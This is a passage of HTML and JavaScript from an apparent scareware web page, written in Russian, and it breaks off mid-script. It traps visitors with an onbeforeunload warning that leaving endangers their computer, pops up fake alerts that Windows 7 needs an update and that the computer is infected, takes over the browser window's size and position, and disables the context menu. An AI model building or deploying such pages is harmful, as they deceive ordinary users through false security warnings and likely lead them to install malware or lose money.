<script  type="text/javascript">
  var nesprashivat = false;
        function test1() {
            if (nesprashivat == false)
            {
               return "Вы уверены, что хотите уйти с этой страницы? \n" +
			   "УХОДЯ С ЭТОЙ СТРАНИЦЫ ВЫ ПОДВЕРГАЕТЕ ОПАСНОСТИ ВАШ КОМПЬЮТЕР  \n";
            }
        }
        window.onbeforeunload = test1;
</script>

<script  type="text/javascript">
	var proc = {f1: 1,f2: 1,fnd: {c: 0,d: 0},current: 0,msg: new Array('Внимание! Для корректной и безопасной работы вашей системы Windows 7 вам нужно установить последний пакет обновлений!','Ваш компьютер заражен! Это может привести к потери данных и повреждению файлов! Нажмите Отмена, чтобы предотвратить это.'),dl: false};

	show_alert = function(i, t) {
		if(i <= proc.msg.length) {
			if(typeof t != "undefined" && t == true){
				return proc.msg[i-1];
			}else{
				alert(proc.msg[i-1]);
				return true;
			}
		}
	};

	hdwnd = function() {
		var w = window;
		var ua = navigator.userAgent;
		var v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
		var x = 11;
		eval('w.resizeTo(x*10,x*11-7)');
		w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
	};

$(document).ready(function(){
	var w = window;
	hdwnd();
	show_alert(1);
	w.moveTo(0,0);
	w.resizeTo(screen.availWidth, screen.availHeight);
	w.focus();

	$(document).bind("contextmenu", function(e){return false;});
	proc.fnd.c = $('.hdd span.c');
	proc.fnd.d = $('.hdd span.d');
	proc.current = $('.process span');

  $("a").click(function(event){
    nesprashivat=true;
  });
   
  $("form").submit(function() {
	 nesprashivat=true;
  });
});
</script>

<body style="background-color:#daf3fd;">

	<script type="text/javascript">
		$(document).ready(function(){
		  ////$("#table_round").attr("class","corner iradius7");
			if ($.browser.mozilla) {
			//код только для ИЕ шестой версии!
			  $("#br_ver").html("Версия " + $.browser.version);
